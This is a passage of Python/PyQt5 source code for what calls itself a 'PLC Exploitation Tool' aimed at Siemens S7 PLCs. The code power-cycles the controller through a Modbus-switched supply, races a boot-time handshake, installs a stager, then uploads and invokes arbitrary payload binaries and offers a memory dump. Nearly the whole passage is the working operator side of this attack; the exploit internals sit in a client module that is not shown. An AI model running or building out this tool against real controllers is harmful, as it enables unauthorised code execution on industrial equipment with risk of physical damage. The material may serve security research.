    def _handle_plc_connected(self, version_str, greeting_hex):
        self._log_to_program_output(f"Thread: Handshake successful! Greeting: {greeting_hex}", "INFO")
        self._log_to_program_output(f"Thread: PLC Version: {version_str}", "INFO")
        self._log_to_program_output(f"Thread: Stager installed.", "INFO")
        self.status_bar.showMessage(f"Connected to PLC. Version: {version_str}. Stager installed.")
        
        self.disconnect_button.setEnabled(True)
        self.connect_button.setEnabled(False) # Keep connect disabled
        self.start_dump_button.setEnabled(True)
        self.execute_payload_button.setEnabled(True)

    def _handle_plc_connection_error(self, error_message):
        self._log_to_program_output(f"Thread: PLC Connection Error: {error_message}", "ERROR")
        self._show_message("Connection Failed", f"PLC Connection Error: {error_message}", "error") # _show_message already logs
        if self.client_instance: # Should be handled by thread, but good practice
            self.client_instance.disconnect()
            self.client_instance = None
        
        self.connect_button.setEnabled(True) # Re-enable connect button
        self.disconnect_button.setEnabled(False)
        self.start_dump_button.setEnabled(False)
        self.execute_payload_button.setEnabled(False)
        # Optionally stop socat if connection fails completely
        # self._stop_socat()


    def _execute_generic_payload(self):
        if not self.client_instance or not self.client_instance.r:
            self._show_message("Error", "Not connected to PLC. Cannot execute payload.", "error")
            return

        payload_path = self.gen_payload_path_input.text()
        if not payload_path:
            self._show_message("Input Error", "Please select a payload file first.", "error")
            return

        payload_args = self.gen_payload_args_input.text()

        self._log_to_program_output(f"Starting execution of generic payload: {payload_path} with args: '{payload_args}'", "INFO")
        self.execute_payload_button.setEnabled(False) # Disable button during execution

        # Create and start the payload execution thread
        if hasattr(self, 'payload_thread') and self.payload_thread and self.payload_thread.isRunning():
            self._log_to_program_output("Payload execution already in progress.", "WARNING")
            # self.execute_payload_button.setEnabled(True) # Re-enable if needed, or just let it be
            return

        self.payload_thread = ExecutePayloadThread(self.client_instance, payload_path, payload_args, self)
        self.payload_thread.payload_execution_result.connect(self._handle_payload_execution_result)
        self.payload_thread.finished.connect(self._on_payload_thread_finished)
        self.payload_thread.start()

    def _handle_payload_execution_result(self, message, level):
        self._log_to_program_output(f"PayloadThread: {message}", level)
        # Optionally show a status bar message for critical results
        if level == "ERROR" or level == "CRITICAL":
            self.status_bar.showMessage(f"Payload execution error: {message[:100]}", 5000)
        elif level == "INFO" and "response" in message: # Show brief success in status bar
             self.status_bar.showMessage("Payload executed, response received.", 3000)


    def _on_payload_thread_finished(self):
        self._log_to_program_output("Payload execution thread finished.", "DEBUG")
        self.execute_payload_button.setEnabled(True) # Re-enable the button


    def _disconnect_plc(self):
        # If a connection thread is running, we might need to signal it to stop/cancel.
        # For now, assume connection thread finishes before disconnect is typically hit,
        # or that client_instance operations are thread-safe / main thread only after connect.
        if hasattr(self, 'connection_thread') and self.connection_thread and self.connection_thread.isRunning():
            self._log_to_program_output("Attempting to stop connection thread before disconnect...", "DEBUG")
            # Add thread termination logic if applicable (e.g., setting a flag and waiting)
            # self.connection_thread.quit() # Or a custom stop method
            # self.connection_thread.wait(1000) # Wait a bit
            # For simplicity, this example doesn't implement full cancellable thread for connect.

        self.status_bar.showMessage("Disconnecting...")
        self._log_to_program_output("Disconnecting from PLC...", "INFO")

        if self.client_instance:
            try:
                # Ask user if they want to send 'bye' or just disconnect
                reply = QMessageBox.question(self, 'Confirm Disconnect', 
                                           "Send 'bye' command to PLC to allow normal boot?",
                                           QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel, 
                                           QMessageBox.Yes)

                if reply == QMessageBox.Cancel:
                    self.status_bar.showMessage("Disconnect cancelled.")
                    self._log_to_program_output("Disconnect cancelled by user.", "INFO")
                    return
                
                if reply == QMessageBox.Yes:
                    self._log_to_program_output("Sending bye() command to PLC...", "INFO")
                    if self.client_instance.send_bye():
                        self._log_to_program_output("bye() command sent successfully.", "INFO")
                    else:
                        self._log_to_program_output("Failed to send bye() or unexpected response.", "WARNING")
                
            except Exception as e:
                self._log_to_program_output(f"Error sending bye: {e}", "ERROR")
                self._show_message("Disconnect Error", f"Error during bye command: {e}", "error")
            finally:
                self.client_instance.disconnect() # This logs internally
                self.client_instance = None
        
        # self._stop_socat() # DO NOT stop socat on PLC disconnect as per new requirement

        self.status_bar.showMessage("Disconnected from PLC.")
        # If socat is running, Connect button should be enabled.
        # If socat is NOT running, Connect button should remain disabled.
        # This state is managed by _start_socat_manual, _stop_socat_manual, and _socat_finished.
        if self.socat_process and self.socat_process.state() == QProcess.Running:
            self.connect_button.setEnabled(True)
        else:
            self.connect_button.setEnabled(False)

        self.disconnect_button.setEnabled(False)
        self.start_dump_button.setEnabled(False)
        self.execute_payload_button.setEnabled(False)
        self._log_to_program_output("Disconnected from PLC. Socat state unchanged by this action.", "INFO")


# --- Worker Threads ---

class ExecutePayloadThread(QThread):
    # Signal to emit results or errors
    # result_signal: str with message, str with level (INFO, ERROR, etc.)
    payload_execution_result = pyqtSignal(str, str)

    def __init__(self, client_instance, payload_path, payload_args_str, parent_gui):
        super().__init__(parent_gui)
        self.client_instance = client_instance
        self.payload_path = payload_path
        self.payload_args_str = payload_args_str # Will be encoded to bytes in run()
        self.parent_gui = parent_gui # To use _log_to_program_output or emit signals

    def run(self):
        try:
            if not self.client_instance or not self.client_instance.r:
                self.payload_execution_result.emit("Not connected to PLC. Cannot execute payload.", "ERROR")
                return

            if not os.path.exists(self.payload_path):
                self.payload_execution_result.emit(f"Payload file not found: {self.payload_path}", "ERROR")
                return

            self.payload_execution_result.emit(f"Reading payload: {self.payload_path}", "INFO")
            with open(self.payload_path, "rb") as f:
                payload_code = f.read()

            if not payload_code:
                self.payload_execution_result.emit("Payload file is empty.", "ERROR")
                return

            self.payload_execution_result.emit(f"Payload size: {len(payload_code)} bytes. Installing...", "INFO")

            # Determine hook index - for generic payloads, we might reuse DEFAULT_SECOND_ADD_HOOK_IND
            # or make it configurable in the GUI later. For now, use a common one.
            # Ensure client.py has this constant or pass it.
            target_hook_index = client.DEFAULT_SECOND_ADD_HOOK_IND

            # install_payload_via_stager logs its own progress/errors via client's logger
            # That logger isn't yet piped to GUI, so we emit our own signals here.
            installed_hook_idx = self.client_instance.install_payload_via_stager(payload_code, add_hook_no=target_hook_index)
            self.payload_execution_result.emit(f"Payload installed at hook index: {installed_hook_idx}", "INFO")

            # Convert string args to bytes. For simplicity, assume UTF-8.
            # More complex arg handling (hex, etc.) could be added later.
            try:
                payload_args_bytes = self.payload_args_str.encode('utf-8')
            except Exception as e:
                self.payload_execution_result.emit(f"Error encoding arguments: {e}", "ERROR")
                return

            self.payload_execution_result.emit(f"Invoking payload with args: '{self.payload_args_str}' (bytes: {payload_args_bytes.hex()})", "INFO")

            # invoke_add_hook also logs via client's logger
            response = self.client_instance.invoke_add_hook(installed_hook_idx, payload_args_bytes, await_response=True)

            if response is not None:
                response_hex = response.hex()
                try:
                    response_str = response.decode('utf-8', errors='replace')
                    self.payload_execution_result.emit(f"Payload response (UTF-8): '{response_str}'\nHex: {response_hex}", "INFO")
                except Exception:
                    self.payload_execution_result.emit(f"Payload response (Hex): {response_hex}", "INFO")
            else:
                self.payload_execution_result.emit("Payload invoked, no response received or error in reception.", "WARNING")

        except client.PLCInterface.HandshakeError as he: # Should not happen here if already connected
            self.payload_execution_result.emit(f"Handshake Error during payload execution: {he}", "ERROR")
        except ConnectionError as ce:
            self.payload_execution_result.emit(f"Connection Error during payload execution: {ce}", "ERROR")
        except ValueError as ve:
            self.payload_execution_result.emit(f"Value Error during payload execution: {ve}", "ERROR")
        except RuntimeError as re:
            self.payload_execution_result.emit(f"Runtime Error during payload execution: {re}", "ERROR")
        except Exception as e:
            self.payload_execution_result.emit(f"An unexpected error occurred during payload execution: {e}", "CRITICAL")
        finally:
            # Re-enable button in GUI via signal or direct call if safe
            # For now, let the main thread handle button re-enabling on thread finish
            pass


class PLCConnectionThread(QThread):
    # Signals: success_signal(version_str, greeting_hex), error_signal(error_message)
    connection_succeeded = pyqtSignal(str, str) # version_str, greeting_hex
    connection_failed = pyqtSignal(str)    # error_message

    def __init__(self, host, port, stager_payload_path, parent_gui):
        super().__init__(parent_gui)
        self.host = host
        self.port = port
        self.stager_payload_path = stager_payload_path
        self.parent_gui = parent_gui # To access client_instance, log methods

    def run(self):
        try:
            # --- Power Cycle Step ---
            modbus_ip = self.parent_gui.modbus_ip_input.text()
            try:
                modbus_port = int(self.parent_gui.modbus_port_input.text())
                modbus_output = int(self.parent_gui.modbus_output_input.text())
                power_delay_ms = int(self.parent_gui.power_delay_input.text())
            except ValueError:
                self.connection_failed.emit("Invalid Modbus port, output, or power delay. Must be integers.")
                return

            self.parent_gui._log_to_program_output(f"Thread: Starting power cycle (IP: {modbus_ip}, Port: {modbus_port}, Output: {modbus_output}, Delay: {power_delay_ms}ms)...", "INFO")
            if not self.parent_gui._cycle_power_supply(modbus_ip, modbus_port, modbus_output, power_delay_ms):
                # _cycle_power_supply logs its own errors
                self.connection_failed.emit("Power cycle sequence failed.")
                return
            self.parent_gui._log_to_program_output("Thread: Power cycle completed. Waiting briefly for PLC to initialize...", "INFO")
            # Critical: Wait a very short time for PLC to be ready to receive handshake after power ON.
            # The 500ms window is from PLC powered up to receiving the first byte of handshake.
            # This sleep is part of that budget.
            time.sleep(0.2) # 200ms, adjust as needed based on PLC behavior.

            # --- Connection and Handshake Step ---
            self.parent_gui.client_instance = client.PLCInterface(self.host, self.port)
            
            if not self.parent_gui.client_instance.connect(): # connect() in client.py logs errors
                self.connection_failed.emit(f"Socket connection failed to {self.host}:{self.port}.")
                return

            self.parent_gui._log_to_program_output(f"Thread: Socket connected to {self.host}:{self.port}. Attempting handshake...", "INFO")

            success, greeting = self.parent_gui.client_instance.perform_handshake()
            if not success:
                self.parent_gui.client_instance.disconnect() # Clean up socket connection
                self.parent_gui.client_instance = None
                self.connection_failed.emit(f"Handshake failed: {greeting}")
                return
            
            greeting_hex = greeting.hex() if greeting else "N/A"
            version_str = self.parent_gui.client_instance.get_plc_version()
            
            if not os.path.exists(self.stager_payload_path):
                self.parent_gui.client_instance.disconnect()
                self.parent_gui.client_instance = None
                self.connection_failed.emit(f"Stager payload {self.stager_payload_path} not found!")
                return

            with open(self.stager_payload_path, "rb") as f:
                stager_code = f.read()
            
            self.parent_gui._log_to_program_output(f"Thread: Installing stager ({len(stager_code)} bytes)...", "INFO")
            # install_stager_payload in client.py logs its own success/failure
            self.parent_gui.client_instance.install_stager_payload(stager_code)
            
            # If all successful (install_stager_payload would raise on error)
            self.connection_succeeded.emit(version_str, greeting_hex)

        except FileNotFoundError as fnf_err:
            self.connection_failed.emit(str(fnf_err))
            if self.parent_gui.client_instance:
                 self.parent_gui.client_instance.disconnect()
            self.parent_gui.client_instance = None
        except Exception as e:
            self.connection_failed.emit(f"An unexpected error occurred in connection thread: {e}")
            if self.parent_gui.client_instance: # Ensure client is cleaned up
                 self.parent_gui.client_instance.disconnect()
            self.parent_gui.client_instance = None
        except client.PLCInterface.HandshakeError as he: # Custom exception for handshake specific issues
            self.connection_failed.emit(f"Handshake Error: {he}")
            if self.parent_gui.client_instance:
                 self.parent_gui.client_instance.disconnect()
            self.parent_gui.client_instance = None
        except ConnectionRefusedError: # More specific error for socket connection
            self.connection_failed.emit(f"Connection refused by {self.host}:{self.port}. Ensure socat is forwarding correctly and PLC is ready.")
            # client_instance might not be set yet or connect() failed
            if hasattr(self.parent_gui, 'client_instance') and self.parent_gui.client_instance:
                 self.parent_gui.client_instance.disconnect()
            self.parent_gui.client_instance = None


    def _cycle_power_supply(self, modbus_ip, modbus_port, modbus_output, delay_ms):
        if not client:
            self._log_to_program_output("client.py module not loaded, cannot cycle power.", "ERROR")
            return False
        try:
            self._log_to_program_output(f"Cycling power: Turning OFF Output {modbus_output} at {modbus_ip}:{modbus_port}", "INFO")
            if not client.switch_power('off', modbus_ip, modbus_port, modbus_output):
                self._log_to_program_output("Failed to turn power OFF.", "ERROR")
                # self._show_message("Power Cycle Error", "Failed to turn power OFF.", "error") # Thread should not call QMessageBox
                return False

            self._log_to_program_output(f"Power OFF successful. Waiting for {delay_ms}ms...", "INFO")
            time.sleep(delay_ms / 1000.0)

            self._log_to_program_output(f"Cycling power: Turning ON Output {modbus_output}...", "INFO")
            if not client.switch_power('on', modbus_ip, modbus_port, modbus_output):
                self._log_to_program_output("Failed to turn power ON.", "ERROR")
                # self._show_message("Power Cycle Error", "Failed to turn power ON.", "error")
                return False

            self._log_to_program_output("Power ON successful. Power cycle complete.", "INFO")
            return True

        except Exception as e:
            self._log_to_program_output(f"Error during power cycle: {e}", "ERROR")
            # self._show_message("Power Cycle Error", f"An unexpected error occurred: {e}", "error")
            return False


    def _create_menu_bar(self):
        self.menu_bar = QMenuBar(self)
        self.setMenuBar(self.menu_bar)

        # File menu
        file_menu = self.menu_bar.addMenu("&File")
        exit_action = QAction("&Exit", self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)

        # Help menu
        help_menu = self.menu_bar.addMenu("&Help")
        about_action = QAction("&About", self)
        # about_action.triggered.connect(self._show_about_dialog) # To be implemented
        help_menu.addAction(about_action)

    def _create_status_bar(self):
        self.status_bar = QStatusBar(self)
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready")

    # def _show_about_dialog(self):
    #     QMessageBox.about(self, "About PLC Exploitation Tool",
    #                       "A GUI tool for interacting with Siemens S7 PLCs.")

    def closeEvent(self, event):
        """Handles the main window close event."""
        self._log_to_program_output("Close event triggered. Cleaning up...", "INFO")

        # Attempt to disconnect from PLC if connected
        if self.client_instance and self.client_instance.r:
            self._log_to_program_output("PLC seems connected, attempting graceful disconnect...", "INFO")
            # Simplified disconnect: just close client socket, don't send bye or ask user.
            try:
                self.client_instance.disconnect()
            except Exception as e:
                self._log_to_program_output(f"Error during client disconnect on exit: {e}", "WARNING")
            self.client_instance = None

        # Stop socat if it's running
        if self.socat_process and self.socat_process.state() != QProcess.NotRunning:
            self._log_to_program_output("Stopping socat process on exit...", "INFO")
            self._stop_socat() # This will terminate/kill and wait briefly

        self._log_to_program_output("Cleanup finished. Exiting application.", "INFO")
        event.accept() # Accept the close event


if __name__ == '__main__':
    app = QApplication(sys.argv)
    main_window = PLCExploitGUI()
    main_window.show()
    sys.exit(app.exec_())
